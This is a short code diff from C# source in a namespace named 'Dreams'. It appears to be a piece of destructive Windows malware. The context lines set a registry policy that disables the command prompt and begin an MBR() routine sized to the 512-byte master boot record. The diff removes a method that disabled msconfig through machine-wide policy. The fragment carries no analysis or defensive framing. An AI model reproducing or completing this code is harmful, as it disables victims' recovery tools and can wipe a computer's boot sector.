@@ -37,10 +37,7 @@ namespace Dreams
         {
             Registry.SetValue(@"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\System", "DisableCMD", 1, RegistryValueKind.DWord);
         }
-        public static void DisableMSconfig()
-        {
-            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableMsConfig", 1, RegistryValueKind.DWord);
-        }
+
         public static void MBR()
         {
             const uint mbrsize = 512u;
